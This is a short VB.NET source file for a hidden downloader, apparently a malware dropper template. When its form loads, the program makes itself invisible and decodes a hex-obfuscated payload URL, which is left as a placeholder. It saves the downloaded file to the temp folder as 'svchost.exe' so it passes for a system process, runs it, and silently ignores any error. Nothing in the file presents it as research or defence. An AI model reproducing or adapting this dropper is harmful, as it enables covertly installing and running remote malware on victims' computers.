Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        Me.Opacity = 0
        Dim URL As String = Hex2String("Convert To HEX The Download payload Link")
        Dim Doumloadto As String = Environ("temp") & "\svchost.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(Doumloadto, w.DownloadData(URL))
            Process.Start(Doumloadto)
        Catch ex As Exception

        End Try
        Me.Close()
    End Sub
	
	Public Function Hex2String(ByVal input As String) As String
        Dim out As New System.Text.StringBuilder
        Dim data As String() = Split(input, " ")
        For Each s As String In data
            out.Append(Chr("&H" & s))
        Next
        Return out.ToString
    End Function
	
End Class